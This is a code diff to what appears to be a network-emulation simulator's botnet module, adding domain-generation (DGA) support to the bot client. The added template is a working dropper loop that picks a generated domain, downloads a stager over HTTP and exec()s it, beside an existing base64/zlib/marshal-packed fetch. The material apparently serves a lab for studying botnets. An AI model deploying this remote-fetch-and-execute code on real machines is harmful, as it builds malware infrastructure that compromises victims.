@@ -6,6 +6,7 @@ from seedsim.core import Node
 from typing import List, Dict
 import zlib,base64,marshal
 import pkgutil
+import inspect
 
 BotnetServerFileTemplates: Dict[str, str] = {}
 
@@ -28,6 +29,28 @@ sleep 3
 python3 /tmp/BotClient.py
 """
 
+BotnetServerFileTemplates['dga_dropper'] = """
+{dga}
+
+import random,sys,zlib,base64,marshal,json,urllib, time
+if sys.version_info[0] > 2:
+    from urllib import request
+
+while True:
+    time.sleep(4)
+    try:
+        domain_list = dga()
+        domain = random.choice(domain_list)
+        dropper_url = 'http://'+domain+':446//stagers/b6H.py'
+
+        urlopen = urllib.request.urlopen if sys.version_info[0] > 2 else urllib.urlopen
+        exec(urlopen(dropper_url).read())
+    except Exception:
+        print("[*] Connection error with domain {{}}, retrying...".format(domain))
+        continue
+
+"""
+
 class BotnetServer(Server):
     """!
     @brief The BotnetServer class.
@@ -42,6 +65,7 @@ class BotnetServer(Server):
 
         @param node node.
         """
+        asn = node.getAsn()
         self.__node = node
         self.__port = 445
         try:
@@ -87,18 +111,24 @@ class BotnetClient(Server):
     __node: Node
     __port: int
 
-    def __init__(self, node: Node, C2ServerIp: str):
+    def __init__(self, node: Node, C2ServerIp, dga=None):
         """!
         @brief BotnetClient constructor.
 
-        @param node node.
-        @param C2ServerIp use for connecting C2 server
+        @:param node node.
+        @:param C2ServerIp use for connecting C2 server
+        @:param dga DGA function, used for generating multiple random C2 domains.
         """
-        self.__c2_server_url = 'http://{}:446//stagers/b6H.py'.format(C2ServerIp)
+        self.__c2_server_url = 'http://'+C2ServerIp+':446//stagers/b6H.py'
         self.__c2_server_ip = C2ServerIp
-        self.__dropper = BotnetServerFileTemplates['dropper']\
-            .format(repr(base64.b64encode(zlib.compress(marshal.dumps("urlopen({}).read()"
+        if dga is None:
+            self.__dropper = BotnetServerFileTemplates['dropper']\
+                        .format(repr(base64.b64encode(zlib.compress(marshal.dumps("urlopen({}).read()"
                                                                       .format(repr(self.__c2_server_url)),2)))))
+        else:
+            dga_source_code = inspect.getsource(dga)
+            self.__dropper = BotnetServerFileTemplates['dga_dropper'].format(dga=dga_source_code)
+        asn = node.getAsn()
         self.__node = node
         self.__port = 445
 
@@ -148,10 +178,8 @@ class BotnetService(Service):
 
     def installC2(self, node: Node) -> BotnetServer:
         """!
-        @brief install C2 server to node
-        @param node the node of attacker
-
-        @returns botnet server.
+        @brif install C2 server to node
+        @:param node, the node of attacker
         """
         server: BotnetServer = node.getAttribute('__botnet_service_server')
         if server != None: return server
@@ -160,18 +188,15 @@ class BotnetService(Service):
         node.setAttribute('__botnet_service_server', server)
         return server
 
-    def installBot(self, node: Node, C2ServerIp: str) -> BotnetClient:
+    def installBot(self, node: Node, C2ServerIp, dga=None) -> BotnetClient:
         """!
-        @brief install bot client to node
-
-        @param node the node of victim or bot
-        @param C2ServerIp the IP of C2 server
-
-        @returns botnet client.
+        @brif install bot client to node
+        @:param node, the node of victim or bot
+        @:param C2ServerIp, the IP of C2 server
         """
         server: BotnetClient = node.getAttribute('__botnet_service_client')
         if server != None: return server
-        server = BotnetClient(node, C2ServerIp)
+        server = BotnetClient(node, C2ServerIp, dga)
         self.__servers.append(server)
         node.setAttribute('__botnet_service_client', server)
         return server
